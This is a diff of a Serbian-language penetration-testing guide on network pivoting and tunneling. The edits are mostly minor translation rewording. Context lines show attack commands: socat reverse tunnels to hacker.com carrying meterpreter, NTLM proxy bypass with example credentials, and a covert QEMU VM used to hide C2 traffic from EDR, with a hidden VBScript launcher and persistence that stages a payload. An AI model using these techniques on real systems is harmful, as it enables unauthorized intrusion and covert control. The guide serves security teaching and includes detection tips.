@@ -89,7 +89,7 @@ route add -net 10.0.0.0/16 gw 1.1.1.1
 ```
 > [!NOTE]
 > **Bezbednost – Terrapin napad (CVE-2023-48795)**
-> Napad Terrapin degradacije iz 2023. godine može omogućiti napadaču "man-in-the-middle" da manipuliše ranim SSH rukovanjem i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Osigurajte da su i klijent i server zakrpljeni (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili eksplicitno onemogućite ranjive `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` algoritme u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tuneli.
+> Napad na downgrade Terrapin iz 2023. može omogućiti napadaču u sredini da manipuliše ranim SSH rukovanjem i ubaci podatke u **bilo koji prosleđeni kanal** ( `-L`, `-R`, `-D` ). Osigurajte da su i klijent i server zakrpljeni (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ili eksplicitno onemogućite ranjive `chacha20-poly1305@openssh.com` i `*-etm@openssh.com` algoritme u `sshd_config`/`ssh_config` pre nego što se oslonite na SSH tuneli.
 
 ## SSHUTTLE
 
@@ -250,7 +250,7 @@ attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
 ```
-Pivot kroz **NTLM proxy**
+Pivotiranje kroz **NTLM proxy**
 ```bash
 victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
 ```
@@ -290,7 +290,7 @@ attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,f
 victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
 #Execute the meterpreter
 ```
-Možete zaobići **neautentifikovani proxy** izvršavajući ovu liniju umesto poslednje u konzoli žrtve:
+Možete zaobići **neautentifikovani proxy** izvršavanjem ove linije umesto poslednje u konzoli žrtve:
 ```bash
 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
 ```
@@ -326,7 +326,7 @@ attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh o
 
 To je kao konzolna verzija PuTTY (opcije su vrlo slične ssh klijentu).
 
-Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo imali obrnutu vezu. Zatim, da bismo preusmerili samo lokalno dostupni port na port na našoj mašini:
+Pošto će ova binarna datoteka biti izvršena na žrtvi i to je ssh klijent, potrebno je da otvorimo naš ssh servis i port kako bismo mogli da imamo obrnutu vezu. Zatim, da bismo prosledili samo lokalno dostupni port na port na našoj mašini:
 ```bash
 echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
 echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
@@ -347,7 +347,7 @@ netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
 ```
 ## SocksOverRDP & Proxifier
 
-Potrebno je imati **RDP pristup preko sistema**.\
+Morate imati **RDP pristup preko sistema**.\
 Preuzmite:
 
 1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Ovaj alat koristi `Dynamic Virtual Channels` (`DVC`) iz funkcije Remote Desktop Service u Windows-u. DVC je odgovoran za **tunelovanje paketa preko RDP veze**.
@@ -364,13 +364,13 @@ Sada možemo **connect** na **victim** preko **RDP** koristeći **`mstsc.exe`**,
 ```
 C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
 ```
-Sada potvrdite na vašem računaru (napadaču) da port 1080 sluša:
+Sada, potvrdite na vašem računaru (napadaču) da port 1080 sluša:
 ```
 netstat -antb | findstr 1080
 ```
 Sada možete koristiti [**Proxifier**](https://www.proxifier.com/) **da proksirate saobraćaj kroz tu port.**
 
-## Proksiranje Windows GUI aplikacija
+## Proksirajte Windows GUI aplikacije
 
 Možete naterati Windows GUI aplikacije da prolaze kroz proksi koristeći [**Proxifier**](https://www.proxifier.com/).\
 U **Profile -> Proxy Servers** dodajte IP adresu i port SOCKS servera.\
@@ -379,7 +379,7 @@ U **Profile -> Proxification Rules** dodajte ime programa koji želite da proksi
 ## NTLM proksi zaobilaženje
 
 Prethodno pomenuti alat: **Rpivot**\
-**OpenVPN** takođe može da ga zaobiđe, postavljanjem ovih opcija u konfiguracionom fajlu:
+**OpenVPN** takođe može da ga zaobiđe, postavljajući ove opcije u konfiguracionom fajlu:
 ```bash
 http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 ```
@@ -387,7 +387,7 @@ http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
 
 [http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)
 
-Ovaj alat se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru preko ovog porta.\
+Ovaj alat se autentifikuje protiv proksija i vezuje lokalni port koji se prosleđuje eksternoj usluzi koju odredite. Zatim možete koristiti alat po vašem izboru kroz ovaj port.\
 Na primer, prosledite port 443.
 ```
 Username Alice
@@ -396,7 +396,7 @@ Domain CONTOSO.COM
 Proxy 10.0.0.10:8080
 Tunnel 2222:<attackers_machine>:443
 ```
-Sada, ako na primer postavite **SSH** servis na žrtvi da sluša na portu 443. Možete se povezati na njega preko napadačkog porta 2222.\
+Sada, ako na primer postavite **SSH** servis na žrtvi da sluša na portu 443. Možete se povezati na njega kroz port 2222 napadača.\
 Takođe možete koristiti **meterpreter** koji se povezuje na localhost:443, a napadač sluša na portu 2222.
 
 ## YARP
@@ -452,7 +452,7 @@ Proxychains presreće `gethostbyname` libc poziv i tuneluje tcp DNS zahtev kroz 
 
 [https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)
 
-## ICMP Tunelovanje
+## ICMP Tunneling
 
 ### Hans
 
@@ -612,7 +612,7 @@ Gore navedena komanda objavljuje port žrtve **8080** kao **attacker_ip:9000** b
 
 ## Tajni VM-bazirani tuneli sa QEMU
 
-QEMU-ova mrežna podrška u korisničkom režimu (`-netdev user`) podržava opciju pod nazivom `hostfwd` koja **vezuje TCP/UDP port na *hostu* i prosleđuje ga u *gosta***. Kada gost pokrene punu SSH demon, pravilo hostfwd vam daje jednokratni SSH jump box koji potpuno živi unutar ephemerne VM – savršeno za skrivanje C2 saobraćaja od EDR-a jer sve zlonamerne aktivnosti i datoteke ostaju na virtuelnom disku.
+Korisnički režim umrežavanja QEMU-a (`-netdev user`) podržava opciju pod nazivom `hostfwd` koja **vezuje TCP/UDP port na *hostu* i prosleđuje ga u *gosta***. Kada gost pokrene punu SSH demon, pravilo hostfwd vam daje jednokratni SSH jump box koji potpuno živi unutar ephemerne VM – savršeno za skrivanje C2 saobraćaja od EDR-a jer sve zlonamerne aktivnosti i datoteke ostaju na virtuelnom disku.
 
 ### Brza jedna linija
 ```powershell
@@ -626,7 +626,7 @@ qemu-system-x86_64.exe ^
 ```
 • Komanda iznad pokreće **Tiny Core Linux** sliku (`tc.qcow2`) u RAM-u.  
 • Port **2222/tcp** na Windows hostu se transparentno prosleđuje na **22/tcp** unutar gosta.  
-• Sa stanovišta napadača, cilj jednostavno izlaže port 2222; svi paketi koji do njega stignu se obrađuju od strane SSH servera koji radi u VM-u.  
+• Sa stanovišta napadača, meta jednostavno izlaže port 2222; svi paketi koji do njega stignu se obrađuju od strane SSH servera koji radi u VM-u.  
 
 ### Pokretanje neprimetno kroz VBScript
 ```vb
@@ -638,7 +638,7 @@ Pokretanje skripte sa `cscript.exe //B update.vbs` drži prozor skrivenim.
 
 ### U gostu postojanost
 
-Budući da je Tiny Core bezdržavni, napadači obično:
+Pošto je Tiny Core bezdržavni, napadači obično:
 
 1. Postavljaju payload na `/opt/123.out`
 2. Dodaju u `/opt/bootlocal.sh`:
@@ -660,7 +660,7 @@ while ! ping -c1 45.77.4.101; do sleep 2; done
 
 • Upozorite na **neočekivane QEMU/VirtualBox/KVM binarne fajlove** u putanjama koje korisnik može pisati.
 • Blokirajte izlazne konekcije koje potiču od `qemu-system*.exe`.
-• Tražite retke portove koji slušaju (2222, 10022, …) koji se vezuju odmah nakon pokretanja QEMU.
+• Tražite retke portove koji slušaju (2222, 10022, …) koji se vezuju odmah nakon pokretanja QEMU-a.
 
 ---
 
